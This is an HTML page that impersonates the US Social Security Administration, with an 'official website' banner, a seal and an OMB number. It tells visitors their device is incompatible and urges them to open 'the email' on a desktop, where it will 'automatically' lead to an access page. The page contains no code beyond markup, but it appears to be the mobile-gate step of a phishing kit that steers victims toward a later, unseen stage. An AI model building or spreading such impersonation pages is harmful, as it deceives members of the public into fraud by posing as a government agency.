<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Incompatible</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

    <div class="top-banner">
        <div class="container">
            <p><img src="img/flag.svg" alt="US Flag" class="flag-icon"> An official website of the United States government</p>
        </div>
    </div>

    <main class="site-main">
        <header class="site-header">
           <img src="img/header-2.svg" alt="Government Seal" class="header-logo seal">
        </header>
        
        <div class="content-box">
            <h2 style="margin-bottom: 25px;">Device Incompatible</h2>
            
            <p style="text-align: left; max-width: 550px; margin: 0 auto 20px auto;">
                The device you’re using isn’t compatible with the security method recommended by SSA. Please switch to a desktop or laptop to access it.
            </p>
            
            <p style="text-align: left; max-width: 550px; margin: 0 auto 30px auto;">
                You can open the email on your desktop or laptop—it will automatically take you to the access page and check compatibility. No additional steps are needed.
            </p>
            
            <p style="font-weight: 500;">
                Your inquiry is appreciated by the Social Security Administration.
            </p>
        </div>
    </main>

    <footer class="site-footer">
        <div class="container">
            <div class="footer-left"><p>OMB No. 0960-0789</p></div>
            <div class="footer-right">
                <button class="lang-button"><i class="fa-solid fa-globe"></i> Language <i class="fa-solid fa-caret-up"></i></button>
                <a href="#">Contact <i class="fa-solid fa-arrow-up-right-from-square"></i></a>
            </div>
        </div>
    </footer>

</body>
</html>